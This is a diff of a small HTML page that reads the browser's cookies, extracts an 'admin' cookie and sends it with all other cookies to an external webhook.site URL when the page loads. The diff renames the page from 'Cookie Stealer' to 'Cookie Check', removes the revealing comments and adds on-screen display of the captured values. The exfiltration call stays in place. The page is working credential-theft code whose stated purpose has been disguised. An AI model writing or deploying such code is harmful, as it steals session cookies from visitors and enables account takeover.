@@ -2,13 +2,13 @@
 <html>
 <head>
   <meta charset="utf-8"/>
-  <title>Cookie Stealer</title>
+  <title>Cookie Check</title>
 </head>
 <body>
-  <h1>Loading...</h1>
+  <h1>Cookie Information</h1>
+  <div id="result"></div>
 
 <script>
-// Function to get admin cookie value
 function getAdminCookie() {
   const cookies = document.cookie.split(';');
   for (let cookie of cookies) {
@@ -20,26 +20,25 @@ function getAdminCookie() {
   return null;
 }
 
-// Get the admin cookie immediately when page loads
 const adminValue = getAdminCookie();
+const resultDiv = document.getElementById('result');
 
-// Send to webhook
-fetch('https://webhook.site/d0cfa850-4cfd-4b43-8de0-af4fb3f51c86', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify({
-    adminCookie: adminValue,
-    allCookies: document.cookie,
-    timestamp: new Date().toISOString(),
-    url: window.location.href
-  })
-}).then(() => {
-  console.log('Admin cookie sent:', adminValue);
-}).catch(err => {
-  console.error('Failed to send:', err);
-});
+if (adminValue) {
+  resultDiv.innerHTML = `
+    <h2 style="color: green;">✅ Admin Cookie Found!</h2>
+    <p><strong>Value:</strong> ${adminValue}</p>
+    <p><strong>All Cookies:</strong> ${document.cookie}</p>
+  `;
+  
+  // Send to webhook
+  fetch('https://webhook.site/d0cfa850-4cfd-4b43-8de0-af4fb3f51c86', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({admin: adminValue, allCookies: document.cookie})
+  });
+} else {
+  resultDiv.innerHTML = '<h2 style="color: red;">❌ No Admin Cookie Found</h2>';
+}
 </script>
 </body>
 </html>
